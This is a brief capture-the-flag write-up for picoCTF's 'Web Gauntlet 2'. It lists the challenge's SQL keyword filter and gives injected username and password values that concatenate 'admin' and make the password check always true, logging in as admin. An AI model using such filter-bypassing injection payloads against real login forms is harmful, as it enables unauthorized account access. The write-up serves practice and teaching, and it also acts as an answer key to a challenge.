# Web Gauntlet 2
AUTHOR : MADSTACKS
DESCRIPTION : This website looks familiar... Log in as admin Site: <br>
http://mercury.picoctf.net:65261/ <br>
Filter: http://mercury.picoctf.net:65261/filter.php <br>

# Solution
Only 1 Round <br>
Filter : `or and true false union like = > < ; -- /* */ admin` <br>
Username = `ad'||'min` <br>
Password = `a' IS NOT 'b` <br>
Query : `SELECT username, password FROM users WHERE username='ad'||'min'' AND password='a' IS NOT 'b'` <br>

Flag can be found in `filter.php` after solving the first round
